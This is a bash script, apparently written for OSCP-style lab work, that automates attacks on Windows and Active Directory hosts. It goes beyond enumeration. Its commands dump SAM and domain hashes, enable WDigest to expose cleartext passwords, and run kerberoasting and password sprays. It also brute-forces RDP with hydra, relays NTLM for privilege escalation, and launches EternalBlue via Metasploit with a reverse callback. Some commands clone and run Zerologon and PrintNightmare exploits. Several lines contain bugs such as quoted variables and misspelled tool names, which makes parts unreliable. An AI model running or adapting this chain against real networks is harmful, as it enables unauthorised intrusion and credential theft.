#!/bin/bash

# May need to change location of Impacket if not within PATH, if you do not know how to do this the script can redownload for you
# This script is used to enumerate AD or windows machines from not within the "network". Such as starting outside but being able to reach the DC, or reach the network.
# Script will save output to the domainip.txt file, for ldap it will create a new directory (nobody reads scripts anyways)
# Thanks for using!

echo -e '\E[31;40m' "Made by OvergrownCarrot1, thanks for using"
echo ""
echo -e '\E[31;35m' "This script looks at other tools, you need impacket, feroxbuster and crackmapexec downloaded and in $PATH to work correctly"
echo ""
echo -e '\E[31;35m' "If you do not know all the information below then leave blank, the more information the more enumeration will happen, may need to run multiple times and check the $DOMAINIP.txt file for more information"; tput sgr0
echo ""
echo -e '\E[31;35m' "Anything that is needed to be downloaded is downloaded with Kali distro in mind, if you use another distro do it yourself..."
echo ""
echo -e '\E[31;40m' "Script is not stuck, it is saving everything to a text file, kerbrute may take a very long time depending on wordlist if using xato-net-10-million-usernames be very patient"; tput sgr0
sleep 2
echo ""

read -p "Lets start off with the important questions NIN? (Not streamer friendly since that is like a thing or something) (y/n)" answer
if [ $answer = y ] ; then
	read -p "My Homie... what song (closer(c)/perfect(p)/head(he)/hand(ha))?" answer
	if [ $answer = c ] ; then
		echo "You dirty dog you"
		xdg-open https://youtube.com/watch?v=ccY25Cb3im0
	elif [ $answer = p ] ; then
		echo "Classic!"
		xdg-open https://youtube.com/watch?v=dn3j6-yQKWQ
	elif [ $answer = he ] ; then
		echo "Bow down before the one you serve..."
		xdg-open https://youtube.com/watch?v=ao-Sahfy7Hg
	elif [ $answer = ha ] ; then
		echo "Dont bite"
		xdg-open https://youtube.com/watch?v=xwhBRJStz7w
	else 
		echo "I am not going to type out every song, come on man"
	fi
fi

read -p "Do you need any of the following tools? (feroxbuster(f), impacket(i)(PrintNightmare Version), crackmapexec(c), ldapdomaindump(l) all (a), none(n)" answer
if [ $answer = f ] ; then
	echo -e '\E[31;40m' "Downloading feroxbuster"
	sudo apt update
	sudo apt install -y feroxbuster
elif [ $answer = i ] ; then
	echo -e '\E[31;40m' "Downloading impacket in home directory"
	sudo apt update
	cd 
	pip3 uninstall impacket
	git clone https://github.com/cube0x0/impacket
	cd impacket
	python3 ./setup.py install
elif [ $answer = c ] ; then
	echo -e '\E[31;40m' "Downloading crackmapexec"
	sudo apt update
	sudo apt install crackmapexec
elif [ $answer = a ] ; then
	echo -e '\E[31;40m' "Downloading all 3"
	sudo apt install -y feroxbuster
	pip3 uninstall impacket
	cd 
	git clone https://github.com/cube0x0/impacket
	cd impacket
	python3 ./setup.py install
	sudo apt install crackmapexec
	sudo pip install ldapdomaindump
	sudo pip install ldap3
	sudo pip install dnspython
	sudo apt update
elif [ $answer = l ]; then
	sudo pip install ldapdomaindump
	sudo pip install ldap3
	sudo pip install dnspython
	sudo apt update
elif [ $answer = n ] ; then
	echo -e '\E[31;40m' "Not downloading anything continuing script"
else
	echo -e '\E[31;40m' "Help me help you... that is not an answer"
fi

echo ""
echo -e '\E[31;40m' "Domain Name"; tput sgr0
read DOMAIN 

echo -e '\E[31;40m' "Domain IP"; tput sgr0
read DOMAINIP

echo -e '\E[31;40m' "Username"; tput sgr0 
read USER 

echo -e '\E[31;40m' "Password"; tput sgr0
read PASS

read -p "If you do not have a userfile already would you like to try GetADUsers.py to make a userfile? (y/n):" answer
if [ $answer = y ] ; then
	GetADUsers.py -all -dc-ip $DOMAINIP > $DOMAINIP.users.txt
	echo -e '\E[31;40m' "Saved to $DOMAINIP.users.txt"
elif [ $answer = n ] ; then
	echo -e '\E[31;40m' "User File if any"; tput sgr0
	read USERFILE
else
	echo ""
fi

if grep https://nmap.org $DOMAINIP.txt
then
	echo -e '\E[31;40m' "$DOMAINIP.txt already exists, not running NMAP scan"
else
	read -p "Would you like to run NMAP or RustScan? Nmap(n) / RustScan (r)" answer
	if [ $answer = n ]; then
		echo -e '\E[31;35m' "Running NMAP to see what is open and putting in $DOMAINIP.txt, only looking at certain ports"; tput sgr0
		nmap -p 21,25,139,445,80,8080,8888,111,3389,5985,135,53,593,3269,636,389,88,443,2049,1521,3306,1433 -vv -Pn -n -T4 -A $DOMAINIP > $DOMAINIP.txt
		echo -e '\E[31;35m' "Ran NMAP on the following ports 21,25,139,445,80,8080,8888,111,3389,5985,135,53,593,3269,636,389,88,443,2049,1521,3306,1433"
		cat $DOMAINIP.txt | grep open > $DOMAINIP.open.txt
		rm -rf $DOMAINIP.txt
		mv $DOMAINIP.open.txt $DOMAINIP.txt
	elif [ $answer = r ]; then
		echo -e '\E[31;35m' "Running RustScan on all ports"
		rustscan -t 5000 -a $DOMAINIP --ulimit 5000 -- -Pn > $DOMAINIP.txt
	else 
		echo -e '\E[31;35m' "Need an n or r"
	fi
fi
echo ""

echo -e '\E[31;35m' "Saving everything to $DOMAINIP.txt"; tput sgr0

if [ $USER ] && [ $PASS ]
then
	read -p "Since you provided a Username and Password would you like to try some crackmapexec stuff? (y/n)" answer
	if [ $answer = y ] ; then
		echo -e '\E[31;35m' "Trying Command Injection with whoami"; tput sgr0
		crackmapexec $DOMAINIP -u '$USER' -p '$PASS' -x whoami >> $DOMAINIP.txt
		echo -e '\E[31;35m' "Trying PowerShell Injection with whoami"; tput sgr0
		crackmapexec $DOMAINIP -u '$USER' -p '$PASS' -X whoami >> $DOMAINIP.txt
		echo -e '\E[31;35m' "Checking for logged in users" ; tput sgr0
		crackmapexec $DOMAINIP -u '$USER' -p '$PASS' --local-auth >> $DOMAINIP.txt
		echo -e '\E[31;35m' "Trying to enumerate shares" ; tput sgr0
		crackmapexec $DOMAINIP -u '$USER' -p '$PASS' --local-auth --shares >> $DOMAINIP.txt
		echo -e '\E[31;35m' "Trying to enable WDigest for LSA password dump in clear text" ; tput sgr0
		crackmapexec $DOMAINIP -u '$USER' -p '$PASS' --local-auth --wdigest enable >> $DOMAINIP.txt
		echo -e '\E[31;35m' "Checking password policy" ; tput sgr0 
		crackmapexec $DOMAINIP -u '$USER' -p '$PASS' --local-auth --pass-pol >> $DOMAINIP.txt
		echo -e '\E[31;35m' "RID Brute Forcing" ; tput sgr0 
		crackmapexec $DOMAINIP -u '$USER' -p '$PASS' --rid-brute >> $DOMAINIP.txt
		echo -e '\E[31;35m' "Trying to dump local SAM hashes" ; tput sgr0 
		crackmapexec $DOMAINIP -u '$USER' -p '$PASS' --local-auth --sam >> $DOMAINIP.txt
	elif [ $answer = n ] ; then
		echo -e '\E[31;35m' "Continuing Script"; tput sgr0
	else 
		echo ""
	fi
else
	echo ""
fi

if [ $USER ] && [ $PASS ]
then
	read -p "Since you provided username and password would like to try ldapdomaindump? (y/n)" answer
	if [ $answer = y ] ; then
		echo "Making $DOMAINIP.ldap directory"
		mkdir $DOMAINIP.ldap
		cd $DOMAINIP.ldap
		ldapdomaindump -u $DOMAIN\\$USER -p $PASS $DOMAINIP
		cd ..
		echo "May want to check out $DOMAINIP.ldap directory to see if there is anything useful in there"
		else
			echo echo -e '\E[31;35m' "Need a y or n"
	fi
else 
		echo "Continuing Script"
fi

if grep 88/tcp $DOMAINIP.txt
then
	echo "IP may be a domain controller, port 88 is open"
	read -p "Would you like to try one of the following (kerberoasting(ki)/kerbrute(kb)/all(a)/none(n) ex: ki)?" answer
	if [ $answer = ki ] ; then
		GetNPUsers.py $DOMAIN/ -no-pass -usersfile $USERFILE -dc-ip $DOMAINIP >> $DOMAINIP.txt
	elif [ $answer = kb ] ; then
		echo -e '\E[31;35m' "Kerbrute location ex: (/home/kali/kerbrute/dist/kerbrute_linux_amd64)"; tput sgr0
		read KERLOC
		echo -e '\E[31;35m' "Kerbrute username file ex: (/usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt)"; tput sgr0
		read KERUSER
		echo -e '\E[31;35m' "Keberos Username Spray"; tput sgr0
		$KERLOC userenum --dc $DOMAINIP -d $DOMAIN -t 200 $KERUSER >> $DOMAINIP.txt
	elif [ $answer = a ] ; then
		nmap -p 88 $DOMAINIP --script=krb5-enum-users.nse -Pn -vv
		GetADUsers.py -all "$DOMAIN/$USER" -dc-ip $DOMAINIP >> $DOMAINIP.txt
		GetNPUsers.py $DOMAIN/ -no-pass -usersfile $USERFILE -dc-ip $DOMAINIP >> $DOMAINIP.txt
		echo -e '\E[31;35m' "Kerbrute location ex: (/home/kali/kerbrute/dist/kerbrute_linux_amd64)"; tput sgr0
		read KERLOC
		echo -e '\E[31;35m' "Kerbrute username file ex: (/usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt)"; tput sgr0
		read KERUSER
		echo -e '\E[31;35m' "Keberos Username Spray"; tput sgr0
		$KERLOC userenum $KERUSER --dc $DOMAINIP -d $DOMAIN -t 200 >> $DOMAINIP.txt
	elif [ $answer = n ] ; then
		echo -e '\E[31;35m' "Will not try Kerberoasting or Kerbrute"; tput sgr0
	else
		echo -e '\E[31;35m' "Not an answer or you spelled something wrong"; tput sgr0
	fi
fi	

if grep 21/tcp $DOMAINIP.txt
then
	echo -e '\E[31;35m' "FTP is open running another scan on it"; tput sgr0
	nmap -p 21 -sC -sV -vv -n $DOMAINIP -Pn >> $DOMAINIP.txt
	echo -e '\E[31;35m' "Check $DOMAINIP.txt to see if FTP allows anonymous access"; tput sgr0
fi

if grep 25/tcp $DOMAINIP.txt
then
	echo -e '\E[31;35m' "SMTP is running, utilizing NMAP to see some stuff"; tput sgr0
	nmap --script=smtp* $DOMAINIP -Pn -vv -sC -sV -p 25 >> $DOMAINIP.txt
fi

if grep 389/tcp $DOMAINIP.txt
then
	echo -e '\E[31;35m' "LDAP is open trying ldapdomaindump and ldapsearch"; tput sgr0
	echo -e '\E[31;35m' "Creating new directory to put any information found into $DOMAINIP.ldap"; tput sgr0
	mkdir $DOMAINIP.ldap
	cd $DOMAINIP.ldap
	echo -e '\E[31;35m' "If information was dumped it will be in here"; tput sgr0
	pwd
	ldapdomaindump ldap://$DOMAINIP:389
	cd ..
	ldapsearch -H ldap://$DOMAINIP -x -b "DC=$DOMAIN,DC=local" '(objectclass=person)' >> $DOMAINIP.txt
fi

if grep 53 $DOMAINIP.txt
then
	echo -e '\E[31;35m' "DNS is running, trying dig and some other stuff"; tput sgr0
	nmap $DOMAINIP -p 53 -vv -sV -sC -Pn --script=dns-zone-transfer.nse,dns-brute.nse >> $DOMAINIP.txt
	dig $DOMAIN @$DOMAINIP any >> $DOMAINIP.txt
	dig -t AXFR $DOMAIN @$DOMAINIP >> $DOMAINIP.txt
fi

if grep 80/tcp $DOMAINIP.txt
then
	echo -e '\E[31;35m' "Web Server is running, trying some scripts"; tput sgr0
	read -p "Would you like to run a feroxbuster with big.txt, may take a while? (y/n)" answer
	if [ $answer = y ] ; then
		read -p "Do you want to install feroxbuster? (y/n)" answer
		if [ $answer = n ] ; then
			echo "Continuing"
			feroxbuster -u http://$DOMAINIP -w /usr/share/wordlists/dirb/big.txt >> $DOMAINIP.txt
		elif [ $answer = y ] ; then
			sudo apt install feroxbuster
			feroxbuster -u http://$DOMAINIP -w /usr/share/wordlists/dirb/big.txt >> $DOMAINIP.txt
		else 
			echo -e '\E[31;35m' "Need a y or n"; tput sgr0
		fi
	elif [ $answer = n ] ; then
		echo -e '\E[31;35m' "Continuing Script"; tput sgr0
	else
		echo -e '\E[31;35m' "Need a y or n"; tput sgr0
	fi
fi

if grep 8080/tcp $DOMAINIP.txt
then
	echo -e '\E[31;35m' "There may be a web server running on port 8080"; tput sgr0
	nmap $DOMAINIP --script=http-vuln*,http-enum -p 8080 -sC -sV -Pn >> $DOMAINIP.txt
	read -p "Would you like to run a feroxbuster with big.txt, may take a while? (y/n)" answer
	if [ $answer = y ] ; then
		read -p "Do you want to install feroxbuster? (y/n)" answer
		if [ $answer = n ] ; then
			echo "Continuing"
			feroxbuster -u http://$DOMAINIP:8080 -w /usr/share/wordlists/dirb/big.txt >> $DOMAINIP.txt
		elif [ $answer = y ] ; then
			sudo apt install feroxbuster
			feroxbuster -u http://$DOMAINIP:8080 -w /usr/share/wordlists/dirb/big.txt >> $DOMAINIP.txt
		else 
			echo -e '\E[31;35m' "Need a y or n"; tput sgr0
		fi
	elif [ $answer = n ] ; then
		echo -e '\E[31;35m' "Continuing Script"
	else
		echo -e '\E[31;35m' "Need a y or n"
	fi
fi

if grep 8888/tcp $DOMAINIP.txt
then
	echo -e '\E[31;35m' "There may be a web server running on port 8888"; tput sgr0
	read -p "Would you like to run a feroxbuster with big.txt, may take a while? (y/n)" answer
	if [ $answer = y ] ; then
		read -p "Do you want to install feroxbuster? (y/n)" answer
		if [ $answer = n ] ; then
			echo "Continuing"
			feroxbuster -u http://$DOMAINIP:8080 -w /usr/share/wordlists/dirb/big.txt >> $DOMAINIP.txt
		elif [ $answer = y ] ; then
			sudo apt install feroxbuster
			feroxbuster -u http://$DOMAINIP:8080 -w /usr/share/wordlists/dirb/big.txt >> $DOMAINIP.txt
		else 
			echo -e '\E[31;35m' "Need a y or n"; tput sgr0
		fi
	elif [ $answer = n ] ; then
		echo -e '\E[31;35m' "Continuing Script"
	else
		echo -e '\E[31;35m' "Need a y or n"
	fi
fi

if grep 443/tcp $DOMAINIP.txt
then
	echo -e '\E[31;35m' "There may be a web server running on port 443"; tput sgr0
	read -p "Would you like to run sslscan(s), feroxbuster(f), both(b) or none(n)?" answer
	if [ $answer = s ] ; then
		echo -e '\E[31;35m' "Running SSLSCAN to view certificates, may take a minute"
		sslscan --show-certificate $DOMAINIP >> $DOMAINIP.txt
		sslscan $DOMAINIP >> $DOMAINIP.txt
	elif [ $answer = f ] ; then
		echo -e '\E[31;35m' "Running feroxbuster with big.txt"
		feroxbuster -u https://$DOMAINIP:443 -w /usr/share/wordlists/dirb/big.txt >> $DOMAINIP.txt
	elif [ $answer = b ] ; then
		echo -e '\E[31;35m' "Running SSLSCAN to view certificates, may take a minute"
		sslscan --show-certificate $DOMAINIP >> $DOMAINIP.txt
		sslscan $DOMAINIP >> $DOMAINIP.txt
		echo -e '\E[31;35m' "Running feroxbuster with big.txt"
		feroxbuster -u https://$DOMAINIP:443 -w /usr/share/wordlists/dirb/big.txt >> $DOMAINIP.txt
	elif [ $answer = n ] ; then
		echo -e '\E[31;35m' "Continuing Script"; tput sgr0
	else
		echo -e '\E[31;35m' "Not an answer"; tput sgr0
	fi
fi

if [ $USER ] && [ $PASS ] && [ $DOMAIN ] && [ $DOMAINIP ]
then
	echo -e '\E[31;35m' "Getting Users SPNs if we can"; tput sgr0
	GetUserSPNs.py "$DOMAIN/$USER:$PASS" -dc-ip $DOMAINIP >> $DOMAINIP.txt
	GetUserSPNs.py "$DOMAIN/$USER:$PASS" -dc-ip $DOMAINIP -request >> $DOMAINIP.txt
		echo -e '\E[31;35m' "Looking up SID"; tput sgr0
	lookupsid.py "$DOMAIN/$USER:$PASS@$DOMAINIP" >> $DOMAINIP.txt
		echo -e '\E[31;35m' "Trying to get Secrets Dump"; tput sgr0
	secretsdump.py "$DOMAIN/$USER:$PASS@$DOMAINIP" -just-dc >> $DOMAINIP.txt
	else
	echo ""
fi

if grep 111/tcp $DOMAINIP.txt
then
	echo -e '\E[31;35m' "RPC is open, checking to see if anonymous login is allowed"; tput sgr0
	rpcclient -U "" -N DOMAINIP >> $DOMAINIP.txt
	rpcinfo -p $DOMAINIP >> $DOMAINIP.txt
fi

if grep 445/tcp $DOMAINIP.txt
then
	echo -e '\E[31;35m' "Checking if SMB is vulnerable to anything"; tput sgr0
	nmap -p 445 --script=smb-vuln-* -Pn $DOMAINIP >> $DOMAINIP.txt
	echo -e '\E[31;35m' "Seeing if anonymous login works with no password, hit enter on the next part"; tput sgr0
	smbclient -L \\\\$DOMAINIP\\ 
	echo -e '\E[31;35m' "Running enum4linux just to make sure, make take a minute"; tput sgr0
	enum4linux $DOMAINIP >> $DOMAINIP.txt
	enum4linux -u $USER -p PASS -a $DOMAINIP >> $DOMAINIP.txt
fi

if grep "CVE:CVE-2017-0143" $DOMAINIP.txt
then
	echo -e '\E[31;40m'"Most likley vulnerable to Eternal Blue"
	read -p "Would you like to automatically exploit Eternal Blue with Metasploit? MAY NOT BE ALLOWED FOR OSCP (y/n)" answer
	if [ $answer = y ] ; then
		echo "LHOST?"
		read LHOST
		echo "LPORT?"
		read LPORT
		msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set LHOST $LHOST;set RHOSTS $DOMAINIP; set LPORT $LPORT; exploit"
	fi
fi

if grep 1521/tcp $DOMAINIP.txt
then
	echo -e '\E[31;35m' "Oracle database is running, testing some stuff"; tput sgr0
	tnscmd10g version -h $DOMAINIP >> $DOMAINIP.txt
	tnscmd10g status -h $DOMAINIP >> $DOMAINIP.txt
fi

if grep 3306/tcp $DOMAINIP.txt
then
	echo -e '\E[31;35m' "MySQL is open, trying some stuff"; tput sgr0
	nmap --script=mysql-* >> DOMAINIP.txt
	read -p "Would you like to try and login with root and no password? (y/n)" answer
	if [ $answer = y ] ; then
		mysql -h $DOMAINIP -u root
	elif [ $answer = n ] ; then
		echo -e '\E[31;35m' "Not trying root no pass"; tput sgr0
	else
		echo -e '\E[31;35m' "Not an answer, need a y or n"; tput sgr0
	fi
fi

if grep 2049/tcp $DOMAINIP.txt
then
	echo -e '\E[31;35m' "NFS Share is running"; tput sgr0
	showmount -e $DOMAINIP >> $DOMAINIP.txt
	read -p "If you can see the mount would you like to try and mount to your own machine? (y/n)" answer
	if [ $answer = y ] ; then
		echo -e '\E[31;35m' "What is the share directory on $DOMAINIP?"; tput sgr0 
		read DOMDIR
		echo -e '\E[31;35m' "Making a directory mount and trying to $DOMAINIP.mount $DOMDIR"; tput sgr0
		mkdir $DOMAINIP.mount
		sudo mount -t nfs $DOMAINIP:$DOMDIR $DOMAINIP.mount
		echo -e '\E[31;35m' "Done mounting, hopefully it worked"; tput sgr0
	elif
		[ $answer = n ] ; then
			echo -e '\E[31;35m' "Not mounting, continuing script"; tput sgr0
	else
		echo -e '\E[31;35m' "Not an answer, need a y or n"; tput sgr0
	fi
fi

if grep 1433/tcp $DOMAINIP.txt
then
	echo -e '\E[31;35m' "MSSQL is running, checking some things"; tput sgr0
	sqsh -s $DOMAINIP -U sa >> $DOMAINIP.txt
fi

echo -e '\E[31;40m' "Testing if vulnerable to Print Nightmare"; tput sgr0
impacket-rpcdump @$DOMAINIP | egrep 'MS-RPRN|MS-PAR' >> $DOMAINIP.txt
impacket-rpcdump @$DOMAIN | egrep 'MS-RPRN|MS-PAR' >> $DOMAINIP.txt
sleep 2
if grep -i "Print System Remote Protocol" $DOMAINIP.txt
then
	read -p "System seems vulnerable to Print Nightmare, exploit? (y/n)" answer
	read -p "Would you like to download a PrintNightmare Script made by OvergrownCarrot1? (y/n)" answer
	if [ $answer = y ] ; then
		git clone https://github.com/overgrowncarrot1/PrintNightmareScript.sh.git
		cd PrintNightmareScript
		sudo bash PrintNightmareScript.sh
		cd ..
elif [ $answer = n ] ; then
	echo -e '\E[31;40m' "Not downloading script"; tput sgr0
else
	echo -e '\E[31;40m' "Need a y or n"; tput sgr0
	fi
fi

read -p "Test for Zero Logon? (y/n)" answer
if [ $answer = y ] ; then
	echo -e '\E[31;40m' "Testing if vulnerable to Zero Logon (this may take some time)"; tput sgr0
	sudo git clone https://github.com/sho-luv/zerologon.git
	echo -e '\E[31;40m' 'SMB Share Name?'; tput sgr0
	read SHARENAME
	cd zerologon
	python3 zerologon.py "$SHARENAME" "$DOMAINIP" -exploit
	cd ..
fi

read -p "Test for Login Brute Force through Crackmapexec SMB? (y/n)" answer
if [ $answer = y ] ; then
	echo -e '\E[31;40m' "Testing for brute force with username and pass file"; tput sgr0
	echo -e '\E[31;40m' "Username or username file to test?"; tput sgr0
	read USERNAME
	echo -e '\E[31;40m' "Location of password file ex: (/usr/share/wordlists/fasttrack.txt)"; tput sgr0
	read PASSFILE
	crackmapexec smb $DOMAINIP -u $USERNAME -p $PASSFILE -d $DOMAIN --continue-on-success >> $DOMAINIP.txt
fi

if [ $USER ] && [ $PASS ] && [ $DOMAIN ] && [ $DOMAINIP ]
then
	read -p "Would you like to try and RDP in? (y/n)"
	if [ $answer = y ] ; then
		xfreerdp "/u:$DOMAIN\$USER" "/p:$PASS" /v:$DOMAINIP
	else
		echo -e '\E[31;40m' "Not trying RDP"
	fi
fi

if grep 5985/tcp $DOMAINIP.txt
then
	read -p "Test for Evil-WinRM Login? (y/n)" answer
	if [ $answer = y ] ; then
		evil-winrm -u $USER -p $PASS -i $DOMAINIP
	elif [ $answer = n ] ; then
		echo "Not trying Evil-WinRM Login"
	else
		echo "Not an answer"
	fi
fi

read -p "Test for PSExec Login (y/n)" answer
if [ $answer = y ] ; then
	psexec.py "$DOMAIN/$USER:$PASS@$DOMAINIP"
elif [ $answer = n ]; then
	echo "Not trying PSExec Login"
else
	echo "Not an answer"
fi

read -p "Try and escalate user with ntlmrealyx.py? (y/n)" answer
if [ $answer = y ] ; then
	echo -e '\E[31;40m' "User to test?"; tput sgr0
	ntlmrealyx.py -t ldap://$DOMAINIP --escalate-user $USER
elif [ $answer = n ]; then
	echo "Not trying to escalate user"
else
	echo "Not an answer"
fi

if grep 3389/tcp $DOMAINIP.txt
then
	read -p "RDP is open try and brute force? (knownuser(ku)/knownpassword(kp)/unknown(u)/no(n) ex ku)" answer
	if [ $answer = ku ] ; then
		echo -e '\E[31;40m' "User to test?"; tput sgr0
		read KNOWNUSER
		echo -e '\E[31;40m' "Password File? ex (/usr/share/wordlists/fasttrack.txt)"
		read HYDRAPASS
		hydra -l $KNOWNUSER -P $HYDRAPASS rdp://$DOMAINIP:3389 >> $DOMAINIP.txt
	elif [ $answer = kp ] ; then
		echo -e '\E[31;40m' "Username File?"; tput sgr0
		read HYDRAUSER
		echo -e '\E[31;40m' "Password to test?"; tput sgr0
		read KNOWNPASS
		hydra -L $HYDRAUSER -p $KNOWNPASS rdp://$DOMAINIP:3389 >> $DOMAINIP.txt
	elif [ $answer = u ] ; then
		echo -e '\E[31;40m' "Ok... Goodluck I guess"; tput sgr0
		echo -e '\E[31;40m' "Username File?"; tput sgr0
		read HYDRAUSER
		echo -e '\E[31;40m' "Password File? ex (/usr/share/wordlists/fasttrack.txt)"
		read HYDRAPASS
		hydra -L HYDRAUSER -P HYDRAPASS rdp://$DOMAINIP:3389 >> $DOMAINIP.txt
	elif [ $answer = n ] ; then
		echo "Not brute forcing RDP, continuing script"
	else
		echo "No idea what you want from me"
	fi
fi

read -p "Do you want to run external Bloodhound? (y/n)" answer
if [ $answer = y ] ; then
	read -p "Do you have bloodhound-python installed? (y/n)" answer
	if [ $answer = y ] ; then
		echo -e '\E[31;40m' "Username?";tput sgr0
		read BLOODUSER
		echo -e '\E[31;40m' "Password?"; tput sgr0
		read BLOODPASS
		bloodhound-python -u BLOODUSER -p BLOODPASS -ns $DOMAINIP -d $DOMAIN -c all
	elif [ $answer = n ] ; then
		echo -e '\E[31;40m' "Installing bloodhound-python"
		pip3 install bloodhound
		echo -e '\E[31;40m' "Username?";tput sgr0
		read BLOODUSER
		echo -e '\E[31;40m' "Password?"; tput sgr0
		read BLOODPASS
		bloodhound-python -u BLOODUSER -p BLOODPASS -ns $DOMAINIP -d $DOMAIN -c all
	else
		echo "Not a valid answer"
	fi
fi

read -p "Do you want to open a new tab for responder? (y/n)" answer
if [ $answer = y ] ; then
	echo -e '\E[31;40m' "Interface to run responder on ex: (eth1)?"; tput sgr0 
	read INT
	xterm -e "sudo responder -I $INT -rdwv;bash"
fi

# if you actually read this, then good job, if you just ran it... shame on you, know what something is doing before you do anything, good thing
# nothing malicious is happening to your own system!!! READ THE DAMN SCRIPTS ON GITHUB!!!